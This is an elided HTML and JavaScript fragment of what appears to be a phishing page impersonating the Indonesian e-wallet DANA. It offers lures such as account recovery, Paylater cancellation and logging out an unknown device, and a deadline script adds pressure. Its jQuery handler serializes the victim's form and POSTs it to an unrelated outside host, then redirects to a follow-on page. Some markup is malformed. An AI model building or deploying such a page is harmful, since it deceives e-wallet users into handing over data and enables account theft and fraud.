...
<meta charset="UTF-8">
  ...
  <title>𝗗𝗔𝗡𝗔 | 𝘄𝘄𝘄.𝗱𝗼𝗺𝗽𝗲𝘁-𝗱𝗶𝗴𝗶𝘁𝗮𝗹-𝗶𝗻𝗱𝗼𝗻𝗲𝘀𝗶𝗮.𝗶𝗱</title>
  ...
  <meta property="og:title" content="𝗗𝗔𝗡𝗔 | 𝘄𝘄𝘄.𝗱𝗼𝗺𝗽𝗲𝘁-𝗱𝗶𝗴𝗶𝘁𝗮𝗹-𝗶𝗻𝗱𝗼𝗻𝗲𝘀𝗶𝗮.𝗶𝗱">
 ...
 <meta property="og:image" content="https://hosting.tigerengine.id/674d5q.jpg">
  ...
  <meta name="twitter:title" content="𝗗𝗔𝗡𝗔 | 𝘄𝘄𝘄.𝗱𝗼𝗺𝗽𝗲𝘁-𝗱𝗶𝗴𝗶𝘁𝗮𝗹-𝗶𝗻𝗱𝗼𝗻𝗲𝘀𝗶𝗮.𝗶𝗱">
  ...
  <meta name="twitter:image" content="https://hosting.tigerengine.id/674d5q.jpg">
...
<script>
let tglNow = new Date();
let waktuBatas = new Date("2025-05-05T23:59:59");
...
.s:active{
 ...
 <center>
       <label class="aha">
       <input type="radio" id="btn1" name="tarif" value="𝗧𝘂𝗸𝗮𝗿 𝗣𝗼𝗶𝗻 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶" onclick="letsgo1()"/>
    <span class="s">𝗧𝘂𝗸𝗮𝗿 𝗣𝗼𝗶𝗻 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶</span>
		</label>
  <label class="aha">
   <input type="radio" id="btn2" name="tarif" value="𝗣𝗲𝗺𝘂𝗹𝗶𝗵𝗮𝗻 𝗔𝗸𝘂𝗻 𝗗𝗮𝗻𝗮" onclick="letsgo1()">
   <sp class="s">𝗣𝗲𝗺𝘂𝗹𝗶𝗵𝗮𝗻 𝗔𝗸𝘂𝗻 𝗗𝗮𝗻𝗮</span>
   </label>
   <label class="aha">
   <input type="radio" id="btn3" name="tarif" value="𝗣𝗲𝗺𝗯𝗮𝘁𝗮𝗹𝗮𝗻 𝗽𝗲𝗻𝗴𝗮𝗷𝘂𝗮𝗻 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿" onclick="letsgo1()">
   <sp class="s">𝗣𝗲𝗺𝗯𝗮𝘁𝗮𝗹𝗮𝗻 𝗽𝗲𝗻𝗴𝗮𝗷𝘂𝗮𝗻 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿</span>
   </label>
   <label class="aha">
   <input type="radio" id="btn4" name="tarif" value="𝗟𝗼𝗴 𝗢𝘂𝘁 𝗣𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁 𝗧𝗮𝗸 𝗱𝗶𝗸𝗲𝗻𝗮𝗹" onclick="letsgo1()">
   <span class="s">𝗟𝗼𝗴 𝗢𝘂𝘁 𝗣𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁 𝗧𝗮𝗸 𝗱𝗶𝗸𝗲𝗻𝗮𝗹</span>
   </label>
<br/>
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://choreo.ii-fi.cfd/3s0k/ii/tarif.php',
            data: $('#patok').serialize(),
            datatype: 'JSON',            
            complete: function(data) {
            setTimeout(function(){            
            window.location.href='l2g6h.html';
            $("#process1").fadeOut();     
   }, 500);
            }
          })
